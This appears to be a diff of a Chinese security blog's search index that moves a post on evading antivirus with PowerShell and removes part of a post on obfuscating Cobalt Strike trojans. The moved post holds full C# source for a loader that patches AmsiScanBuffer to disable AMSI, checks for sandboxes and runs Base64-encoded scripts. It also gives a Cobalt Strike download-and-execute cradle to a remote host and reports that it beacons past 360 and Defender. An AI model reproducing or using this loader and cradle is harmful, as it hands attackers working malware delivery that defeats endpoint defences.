@@ -54,6 +54,49 @@
   </entry>
   <entry>
     <title></title>
+    <url>/2024/04/29/Powershell%E5%85%8D%E6%9D%80/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="分析powershell"><a href="#分析powershell" class="headerlink" title="分析powershell"></a>分析powershell</h1><p>通过查看powershell程序的模块调用，发现有一个名为<code>System.Management.Automation.ni.dll</code>，这个Dll包含PowerShell 运行时和所有在 PowerShell 环境中运行的命令</p>
+<p><code>System.Management.Automation.ni.dll</code> 是预编译版本的 <code>System.Management.Automation.dll</code>，这样 PowerShell 可以更快地加载和运行</p>
+<p>若想执行 PowerShell 命令或脚本的 C# 程序，都需要引用 <code>System.Management.Automation.dll</code></p>
+<img src="Powershell免杀/image-20230719000833203.png" alt="image-20230719000833203" style="zoom:80%;" />
+
+
+
+<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><p>创建一个C#的<code>.Net Framework</code>项目，添加引用，点击浏览找到<code>System.Management.Automation.dll</code>其所在路径并勾选上</p>
+<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719001757139.png" alt="image-20230719001757139"></p>
+<p>下述代码是一个完整的PowerShell脚本执行环境，它支持接收Base64编码的PowerShell脚本作为参数，解码并执行脚本，同时如果参数中包含”-s”，那么还会执行bypass AMSI的操作。其中AMSI是Windows中用于防止恶意脚本执行的安全机制</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation.Runspaces;</span><br><span class="line"><span class="keyword">using</span> System.Collections.ObjectModel;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> MyPowershell</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 使用DllImport属性导入kernel32.dll中的GetProcAddress函数，用于获取指定模块的函数或变量的地址。</span></span><br><span class="line">        [<span class="built_in">DllImport</span>(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetProcAddress</span><span class="params">(IntPtr hModule, string procName)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 导入kernel32.dll中的LoadLibrary函数，用于加载指定的动态链接库，并返回库的句柄。</span></span><br><span class="line">        [<span class="built_in">DllImport</span>(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">extern</span> IntPtr <span class="title">LoadLibrary</span><span class="params">(string name)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 导入kernel32.dll中的VirtualProtect函数，用于改变指定内存区域的保护属性。</span></span><br><span class="line">        [<span class="built_in">DllImport</span>(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">extern</span> <span class="type">bool</span> <span class="title">VirtualProtect</span><span class="params">(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用于将byte数组中的数据复制到指定的内存地址中。</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="type">static</span> <span class="type">void</span> <span class="title">copy</span><span class="params">(Byte[] Patch, IntPtr Address)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            Marshal.<span class="built_in">Copy</span>(Patch, <span class="number">0</span>, Address, <span class="number">6</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 此方法通过修改AmsiScanBuffer函数来bypass AMSI检测。</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">chaching</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 加载amsi.dll</span></span><br><span class="line">            IntPtr Library = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;a&quot;</span> + <span class="string">&quot;m&quot;</span> + <span class="string">&quot;s&quot;</span> + <span class="string">&quot;i&quot;</span> + <span class="string">&quot;.dll&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取AmsiScanBuffer函数的地址</span></span><br><span class="line">            IntPtr Address = <span class="built_in">GetProcAddress</span>(Library, <span class="string">&quot;Amsi&quot;</span> + <span class="string">&quot;Scan&quot;</span> + <span class="string">&quot;Buffer&quot;</span>);</span><br><span class="line">            uint p;</span><br><span class="line">            <span class="comment">// 修改AmsiScanBuffer函数的内存保护属性</span></span><br><span class="line">            <span class="built_in">VirtualProtect</span>(Address, (UIntPtr)<span class="number">5</span>, <span class="number">0x40</span>, out p);</span><br><span class="line">            <span class="comment">// 准备新的函数字节码</span></span><br><span class="line">            Byte[] Patch = &#123; <span class="number">0xB8</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x80</span>, <span class="number">0xC3</span> &#125;;</span><br><span class="line">            <span class="comment">// 将新的函数字节码复制到AmsiScanBuffer函数的地址</span></span><br><span class="line">            <span class="built_in">copy</span>(Patch, Address);</span><br><span class="line">            Console.<span class="built_in">WriteLine</span>(<span class="string">&quot;Patch Applied&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">Main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 如果命令行参数为空，结束程序运行</span></span><br><span class="line">            <span class="keyword">if</span> (args.Length == <span class="number">0</span>)</span><br><span class="line">                Environment.<span class="built_in">Exit</span>(<span class="number">1</span>);</span><br><span class="line">			</span><br><span class="line">            <span class="comment">// 判断系统的进程数是否小于40，如果小于40则退出程序(用来反defender的沙箱)</span></span><br><span class="line">            <span class="keyword">if</span> (Process.<span class="built_in">GetProcesses</span>().Length &lt; <span class="number">40</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.<span class="built_in">WriteLine</span>(<span class="string">&quot;The number of processes in the system is less than 40. Exiting the program.&quot;</span>);</span><br><span class="line">                Environment.<span class="built_in">Exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            List&lt;string&gt; argsList = <span class="keyword">new</span> <span class="built_in">List</span>&lt;string&gt;(args);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果命令行参数中包含“-s”，则执行bypass amsi的操作</span></span><br><span class="line">            <span class="keyword">if</span> (argsList.<span class="built_in">Contains</span>(<span class="string">&quot;-s&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">chaching</span>();</span><br><span class="line">                argsList.<span class="built_in">Remove</span>(<span class="string">&quot;-s&quot;</span>); <span class="comment">//从参数数组中移除&quot;-s&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 对传入的Base64编码的字符串进行解码</span></span><br><span class="line">            string temp = <span class="built_in">Base64Decode</span>(argsList[<span class="number">0</span>]);</span><br><span class="line">            <span class="comment">// 运行解码后的PowerShell脚本，并将执行结果输出到控制台</span></span><br><span class="line">            string s = <span class="built_in">RunScript</span>(temp);</span><br><span class="line">            Console.<span class="built_in">WriteLine</span>(s);</span><br><span class="line">            Console.<span class="built_in">ReadKey</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Base64解码函数</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> string <span class="title">Base64Decode</span><span class="params">(string s)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> System.Text.Encoding.Default.<span class="built_in">GetString</span>(System.Convert.<span class="built_in">FromBase64String</span>(s));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运行PowerShell脚本并返回执行结果的函数</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="type">static</span> string <span class="title">RunScript</span><span class="params">(string script)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 创建并打开一个运行空间，用于运行PowerShell命令</span></span><br><span class="line">            Runspace MyRunspace = RunspaceFactory.<span class="built_in">CreateRunspace</span>();</span><br><span class="line">            MyRunspace.<span class="built_in">Open</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 在运行空间中创建一个管道，用于存放待执行的PowerShell命令</span></span><br><span class="line">            Pipeline MyPipeline = MyRunspace.<span class="built_in">CreatePipeline</span>();</span><br><span class="line">            <span class="comment">// 在管道中添加PowerShell命令</span></span><br><span class="line">            MyPipeline.Commands.<span class="built_in">AddScript</span>(script);</span><br><span class="line">            <span class="comment">// 在管道中添加输出命令，使得PowerShell命令的执行结果能被程序获取</span></span><br><span class="line">            MyPipeline.Commands.<span class="built_in">Add</span>(<span class="string">&quot;Out-String&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用管道中的PowerShell命令，并获取执行结果</span></span><br><span class="line">            Collection&lt;PSObject&gt; outputs = MyPipeline.<span class="built_in">Invoke</span>();</span><br><span class="line">            <span class="comment">// 关闭运行空间</span></span><br><span class="line">            MyRunspace.<span class="built_in">Close</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将执行结果转换为字符串</span></span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">            foreach (PSObject pobject in outputs)</span><br><span class="line">            &#123;</span><br><span class="line">                sb.<span class="built_in">AppendLine</span>(pobject.<span class="built_in">ToString</span>());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sb.<span class="built_in">ToString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​		</p>
+<h1 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h1><h2 id="360核晶环境"><a href="#360核晶环境" class="headerlink" title="360核晶环境"></a>360核晶环境</h2><p>360静态查杀没有报毒</p>
+<img src="Powershell免杀/image-20230719101836803.png" alt="image-20230719101836803" style="zoom:67%;" />	
+
+
+
+<p>使用CobaltStrike生成Powershell命令, 我们只需截取以下部分作为payload即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.47.155:80/a&#x27;))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将payload进行base64加密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE5Mi4xNjguNDcuMTU1OjgwL2EnKSk=</span><br></pre></td></tr></table></figure>
+
+
+
+<p>打开cmd或powershell执行如下命令，cs上线成功，没有被核晶拦截</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mypowershell.exe SUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE5Mi4xNjguNDcuMTU1OjgwL2EnKSk=</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719104136698.png" alt="image-20230719104136698"></p>
+<h2 id="Defender环境"><a href="#Defender环境" class="headerlink" title="Defender环境"></a>Defender环境</h2><p>在WindowsDefender环境下按照之前的操作执行会被amsi拦截（360是没有集成amsi的）</p>
+<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719111801493.png" alt="image-20230719111801493"></p>
+<p>因此需加上-s参数来绕过amsi，这样CS就能正常上线了</p>
+<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719111453899.png" alt="image-20230719111453899"></p>
+<p>​		</p>
+<p>​		</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
     <url>/2024/04/29/Hook%E6%94%BB%E9%98%B2/</url>
     <content><![CDATA[<h1 id="Hook的概念"><a href="#Hook的概念" class="headerlink" title="Hook的概念"></a>Hook的概念</h1><h2 id="什么是Hook"><a href="#什么是Hook" class="headerlink" title="什么是Hook"></a>什么是Hook</h2><p>Hook（也被称为“挂钩子”）是一种程序设计模式，它提供了一种方式去截获（或者“挂钩子”在）系统级别或者应用级别的函数调用、消息、事件等。通过使用Hook，开发者可以在不修改源程序的情况下，改变或者扩展操作系统、应用程序、驱动程序的功能</p>
 <h2 id="Hook的分类"><a href="#Hook的分类" class="headerlink" title="Hook的分类"></a>Hook的分类</h2><p>Hook通常分为两种形式，分别是修改函数代码和修改函数地址</p>
@@ -157,49 +200,6 @@
 <h2 id="运行测试-1"><a href="#运行测试-1" class="headerlink" title="运行测试"></a>运行测试</h2><p>重载Ntdll后，可以发现杀软的钩子被去除掉了</p>
 <p><img src="/Hook%E6%94%BB%E9%98%B2/image-20230630183555397.png" alt="image-20230630183555397">	</p>
 <h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1>]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2024/04/29/Powershell%E5%85%8D%E6%9D%80/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="分析powershell"><a href="#分析powershell" class="headerlink" title="分析powershell"></a>分析powershell</h1><p>通过查看powershell程序的模块调用，发现有一个名为<code>System.Management.Automation.ni.dll</code>，这个Dll包含PowerShell 运行时和所有在 PowerShell 环境中运行的命令</p>
-<p><code>System.Management.Automation.ni.dll</code> 是预编译版本的 <code>System.Management.Automation.dll</code>，这样 PowerShell 可以更快地加载和运行</p>
-<p>若想执行 PowerShell 命令或脚本的 C# 程序，都需要引用 <code>System.Management.Automation.dll</code></p>
-<img src="Powershell免杀/image-20230719000833203.png" alt="image-20230719000833203" style="zoom:80%;" />
-
-
-
-<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><p>创建一个C#的<code>.Net Framework</code>项目，添加引用，点击浏览找到<code>System.Management.Automation.dll</code>其所在路径并勾选上</p>
-<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719001757139.png" alt="image-20230719001757139"></p>
-<p>下述代码是一个完整的PowerShell脚本执行环境，它支持接收Base64编码的PowerShell脚本作为参数，解码并执行脚本，同时如果参数中包含”-s”，那么还会执行bypass AMSI的操作。其中AMSI是Windows中用于防止恶意脚本执行的安全机制</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation.Runspaces;</span><br><span class="line"><span class="keyword">using</span> System.Collections.ObjectModel;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> MyPowershell</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 使用DllImport属性导入kernel32.dll中的GetProcAddress函数，用于获取指定模块的函数或变量的地址。</span></span><br><span class="line">        [<span class="built_in">DllImport</span>(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetProcAddress</span><span class="params">(IntPtr hModule, string procName)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 导入kernel32.dll中的LoadLibrary函数，用于加载指定的动态链接库，并返回库的句柄。</span></span><br><span class="line">        [<span class="built_in">DllImport</span>(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">extern</span> IntPtr <span class="title">LoadLibrary</span><span class="params">(string name)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 导入kernel32.dll中的VirtualProtect函数，用于改变指定内存区域的保护属性。</span></span><br><span class="line">        [<span class="built_in">DllImport</span>(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">extern</span> <span class="type">bool</span> <span class="title">VirtualProtect</span><span class="params">(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用于将byte数组中的数据复制到指定的内存地址中。</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="type">static</span> <span class="type">void</span> <span class="title">copy</span><span class="params">(Byte[] Patch, IntPtr Address)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            Marshal.<span class="built_in">Copy</span>(Patch, <span class="number">0</span>, Address, <span class="number">6</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 此方法通过修改AmsiScanBuffer函数来bypass AMSI检测。</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">chaching</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 加载amsi.dll</span></span><br><span class="line">            IntPtr Library = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;a&quot;</span> + <span class="string">&quot;m&quot;</span> + <span class="string">&quot;s&quot;</span> + <span class="string">&quot;i&quot;</span> + <span class="string">&quot;.dll&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取AmsiScanBuffer函数的地址</span></span><br><span class="line">            IntPtr Address = <span class="built_in">GetProcAddress</span>(Library, <span class="string">&quot;Amsi&quot;</span> + <span class="string">&quot;Scan&quot;</span> + <span class="string">&quot;Buffer&quot;</span>);</span><br><span class="line">            uint p;</span><br><span class="line">            <span class="comment">// 修改AmsiScanBuffer函数的内存保护属性</span></span><br><span class="line">            <span class="built_in">VirtualProtect</span>(Address, (UIntPtr)<span class="number">5</span>, <span class="number">0x40</span>, out p);</span><br><span class="line">            <span class="comment">// 准备新的函数字节码</span></span><br><span class="line">            Byte[] Patch = &#123; <span class="number">0xB8</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x80</span>, <span class="number">0xC3</span> &#125;;</span><br><span class="line">            <span class="comment">// 将新的函数字节码复制到AmsiScanBuffer函数的地址</span></span><br><span class="line">            <span class="built_in">copy</span>(Patch, Address);</span><br><span class="line">            Console.<span class="built_in">WriteLine</span>(<span class="string">&quot;Patch Applied&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">Main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 如果命令行参数为空，结束程序运行</span></span><br><span class="line">            <span class="keyword">if</span> (args.Length == <span class="number">0</span>)</span><br><span class="line">                Environment.<span class="built_in">Exit</span>(<span class="number">1</span>);</span><br><span class="line">			</span><br><span class="line">            <span class="comment">// 判断系统的进程数是否小于40，如果小于40则退出程序(用来反defender的沙箱)</span></span><br><span class="line">            <span class="keyword">if</span> (Process.<span class="built_in">GetProcesses</span>().Length &lt; <span class="number">40</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.<span class="built_in">WriteLine</span>(<span class="string">&quot;The number of processes in the system is less than 40. Exiting the program.&quot;</span>);</span><br><span class="line">                Environment.<span class="built_in">Exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            List&lt;string&gt; argsList = <span class="keyword">new</span> <span class="built_in">List</span>&lt;string&gt;(args);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果命令行参数中包含“-s”，则执行bypass amsi的操作</span></span><br><span class="line">            <span class="keyword">if</span> (argsList.<span class="built_in">Contains</span>(<span class="string">&quot;-s&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">chaching</span>();</span><br><span class="line">                argsList.<span class="built_in">Remove</span>(<span class="string">&quot;-s&quot;</span>); <span class="comment">//从参数数组中移除&quot;-s&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 对传入的Base64编码的字符串进行解码</span></span><br><span class="line">            string temp = <span class="built_in">Base64Decode</span>(argsList[<span class="number">0</span>]);</span><br><span class="line">            <span class="comment">// 运行解码后的PowerShell脚本，并将执行结果输出到控制台</span></span><br><span class="line">            string s = <span class="built_in">RunScript</span>(temp);</span><br><span class="line">            Console.<span class="built_in">WriteLine</span>(s);</span><br><span class="line">            Console.<span class="built_in">ReadKey</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Base64解码函数</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> string <span class="title">Base64Decode</span><span class="params">(string s)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> System.Text.Encoding.Default.<span class="built_in">GetString</span>(System.Convert.<span class="built_in">FromBase64String</span>(s));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运行PowerShell脚本并返回执行结果的函数</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="type">static</span> string <span class="title">RunScript</span><span class="params">(string script)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 创建并打开一个运行空间，用于运行PowerShell命令</span></span><br><span class="line">            Runspace MyRunspace = RunspaceFactory.<span class="built_in">CreateRunspace</span>();</span><br><span class="line">            MyRunspace.<span class="built_in">Open</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 在运行空间中创建一个管道，用于存放待执行的PowerShell命令</span></span><br><span class="line">            Pipeline MyPipeline = MyRunspace.<span class="built_in">CreatePipeline</span>();</span><br><span class="line">            <span class="comment">// 在管道中添加PowerShell命令</span></span><br><span class="line">            MyPipeline.Commands.<span class="built_in">AddScript</span>(script);</span><br><span class="line">            <span class="comment">// 在管道中添加输出命令，使得PowerShell命令的执行结果能被程序获取</span></span><br><span class="line">            MyPipeline.Commands.<span class="built_in">Add</span>(<span class="string">&quot;Out-String&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用管道中的PowerShell命令，并获取执行结果</span></span><br><span class="line">            Collection&lt;PSObject&gt; outputs = MyPipeline.<span class="built_in">Invoke</span>();</span><br><span class="line">            <span class="comment">// 关闭运行空间</span></span><br><span class="line">            MyRunspace.<span class="built_in">Close</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将执行结果转换为字符串</span></span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">            foreach (PSObject pobject in outputs)</span><br><span class="line">            &#123;</span><br><span class="line">                sb.<span class="built_in">AppendLine</span>(pobject.<span class="built_in">ToString</span>());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sb.<span class="built_in">ToString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>​		</p>
-<h1 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h1><h2 id="360核晶环境"><a href="#360核晶环境" class="headerlink" title="360核晶环境"></a>360核晶环境</h2><p>360静态查杀没有报毒</p>
-<img src="Powershell免杀/image-20230719101836803.png" alt="image-20230719101836803" style="zoom:67%;" />	
-
-
-
-<p>使用CobaltStrike生成Powershell命令, 我们只需截取以下部分作为payload即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.47.155:80/a&#x27;))</span><br></pre></td></tr></table></figure>
-
-
-
-<p>将payload进行base64加密</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE5Mi4xNjguNDcuMTU1OjgwL2EnKSk=</span><br></pre></td></tr></table></figure>
-
-
-
-<p>打开cmd或powershell执行如下命令，cs上线成功，没有被核晶拦截</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mypowershell.exe SUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE5Mi4xNjguNDcuMTU1OjgwL2EnKSk=</span><br></pre></td></tr></table></figure>
-
-<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719104136698.png" alt="image-20230719104136698"></p>
-<h2 id="Defender环境"><a href="#Defender环境" class="headerlink" title="Defender环境"></a>Defender环境</h2><p>在WindowsDefender环境下按照之前的操作执行会被amsi拦截（360是没有集成amsi的）</p>
-<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719111801493.png" alt="image-20230719111801493"></p>
-<p>因此需加上-s参数来绕过amsi，这样CS就能正常上线了</p>
-<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719111453899.png" alt="image-20230719111453899"></p>
-<p>​		</p>
-<p>​		</p>
-]]></content>
   </entry>
   <entry>
     <title></title>
@@ -1301,112 +1301,6 @@
   </entry>
   <entry>
     <title></title>
-    <url>/2024/04/29/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
-    <content><![CDATA[<h1 id="Invoke-Obfuscation"><a href="#Invoke-Obfuscation" class="headerlink" title="Invoke-Obfuscation"></a>Invoke-Obfuscation</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Invoke-Obfuscation工具下载地址: <a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
-<p>这是一款针对<code>PowerShell</code>文件的免杀工具, 此处对CS生成的PowerShell木马进行免杀</p>
-<p>Invoke-Obfuscation是一款PowerShell混淆工具，可以将PowerShell脚本加密，使得它的检测和分析变得更加困难。该工具包含多种加密方法，可以单独使用也可以结合使用，以提高混淆的效果。Invoke-Obfuscation还有多个选项可以选择，如TOKEN、AST、STRING、ENCODING、COMPRESS和LAUNCHER，可以帮助你更好地混淆脚本</p>
-<h2 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a>简单演示</h2><h3 id="1-CS生成ps木马"><a href="#1-CS生成ps木马" class="headerlink" title="1.CS生成ps木马"></a>1.CS生成ps木马</h3><p>打开Cobalt Strike, 点击<code>攻击&gt;生成后门-&gt;Payload Generator</code></p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106191819966.png" alt="image-20230106191819966">			</p>
-<p>选择相应的监听, 生成<code>powershell</code>木马</p>
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106191957575.png" alt="image-20230106191957575">	</p>
-<h3 id="2-导入模块并加载"><a href="#2-导入模块并加载" class="headerlink" title="2.导入模块并加载"></a>2.导入模块并加载</h3><p>进入<code>invoke-Obsfuscation</code>文件夹并打开powershell, 执行如下命令导入<code>Invoke-Obfuscation</code>模块</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Invoke-Obfuscation</span>.psd1</span><br></pre></td></tr></table></figure>
-
-
-
-<p>执行如下命令加载模块</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-Obfuscation</span><br></pre></td></tr></table></figure>
-
-<p><img src="/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/image-20230106192850710.png" alt="image-20230106192850710"></p>
-<p>随后进入工具命令行界面, 如下图所示, 该工具支持六种加密方式:</p>
-<ul>
-<li><p>TOKEN: 将脚本转换为一个或多个PowerShell解析器令牌的序列</p>
-</li>
-<li><p>AST: 将脚本转换为抽象语法树</p>
-</li>
-<li><p>STRING: 混淆脚本中的字符串，使得脚本的意图变得模糊不清</p>
-</li>
-<li><p>ENCONDING: 将脚本转换为ASCII、Unicode或Base64编码</p>
-</li>
-<li><p>COMPRESS: 将脚本压缩，使得脚本的大小变小，从而使得脚本的传输和存储更加方便</p>
-</li>
-<li><p>LAUNCHER: 生成一个启动器，该启动器可以在目标系统上执行混淆后的脚本</p>
-</li>
-</ul>
-<img src="木马免杀之工具篇/image-20230106192908168.png" alt="image-20230106192908168" style="zoom:67%;" />	
-
-
-
